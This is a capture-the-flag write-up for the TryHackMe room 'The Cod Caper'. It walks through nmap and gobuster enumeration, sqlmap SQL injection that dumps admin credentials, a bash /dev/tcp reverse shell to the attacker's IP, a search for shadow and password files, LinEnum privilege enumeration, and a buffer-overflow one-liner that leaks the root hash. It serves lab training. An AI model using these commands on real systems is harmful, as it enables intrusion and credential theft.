---
layout: blog
title: THM The Cod Caper Writeup
publishDate: 2023-12-04T16:42:00.000Z
description: Walk-through and answers of TryHackMe CTF room - The Cod Caper.
tags:
  - tryhackme
  - writeup
---
## Task 2: Host Enumeration

Scan the network with nmap using proper techniques to get the answers.

```
nmap -sV -A -vv -oN thecodcaper.nmap -T4 --min-rate=10000 TARGET_IP
```

| Flag | Use               |
| ---- | ----------------- |
| sV   | version detection |
| A    | scan everything   |
| vv   | more verbose      |
| oN   | output file       |
| T4   | for faster scan   |

* Open ports: 2 (22 and 80)
* http-title: Apache2 Ubuntu Default Page: It works
* ssh service version: OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
* Web server version: Apache/2.4.18

## Task 3: Web Enumeration

Scan for the directories using Gobuster.

> Note: Use the `seclists/Discovery/Web-Content/big.txt` wordlist

```
gobuster dir -u http://TARGET_IP/ -x php,txt,html -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -o thecodcaper.gobuster
```

| Flag | Use                     |
| ---- | ----------------------- |
| u    | URL                     |
| x    | File type: txt,html,php |
| w    | wordlist                |
| o    | output                  |

* Important file on the server: /administrator.php

## Task 4: Web Exploitation

On visiting the /administrator.php page, some kind of a login form could be found. The username and password can be found using SQL injection.

```
sqlmap --dump --forms -u http://TARGET_IP/administrator.php
```

| Flag  | Use                                |
| ----- | ---------------------------------- |
| dump  | Prints the output of the injection |
| forms | targets html forms                 |
| u     | URL                                |

![](/images/uploads/pasted-image-20231204172051.png)

Running the same command without `--dump` flag will reveal the number of vulnerable forms:

![](/images/uploads/pasted-image-20231204172253.png)

* Admin username: pingudad
* Admin password: secretpass
* Number of vulnerable forms: 3

## Task 5: Command Execution

Login to the administrator.

Run `ls` to find the number of forms.

To check if pingu has the account or not, check the output of the `/etc/passwd`.

Since we are able to run any linux command, it is better to use a reverse shell.

Start a netcat listening server:

```
nc -nlvp 4444
```

Execute the reverse shell:

```
bash -c 'exec bash -i &>/dev/tcp/YOUR_IP/4444 <&1'
```

The ssh password should be saved in the `/etc/shadow` file, but you would not have superuser privileges to access its contents. But, backups stored in other places might not need sudo. Use the `find` command to search for files:

```
find / -type f -name "shadow*"
```

Command breakdown:

* `/` - look for files in the root directory
* `-type f` - look for files only
* `-name "shadow*"` - filename containing "shadow"

You'll find a backup stored in `/var/backups/shadow.bak` but its not accessible as well. So look for files containing the word "pass".

```
find / -type f -name "pass*"
```

The ssh password should be found in the file `/var/hidden/pass`

* SSH password: pinguapingu

## Task 6: LinEnum

Download LinEnum on your computer from GitHub. Then use `scp` to send the file to the target machine through ssh.

```
scp /opt/LinEnum.sh pingu@TARGET_IP/tmp
```

Login using the credentials gathered from previous task.

After the command is successfully executed, login to the target with ssh and execute the LinEnum.sh script.

```
cd /tmp && ./LinEnum.sh
```

![](/images/uploads/pasted-image-20231207183828.png)

* Secret file: /opt/secret/root

## Task 10: Finishing the job

The previous tasks are just read-only. All you need to do is find out the root hash using binary exploitation. Run this command and you'll get the root hash:

```
python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root
```

![](/images/uploads/pasted-image-20231207185904.png)

This is a sha512crypt hash. Use hashcat to crack the password. It might take some time.

* Root password: love2fish
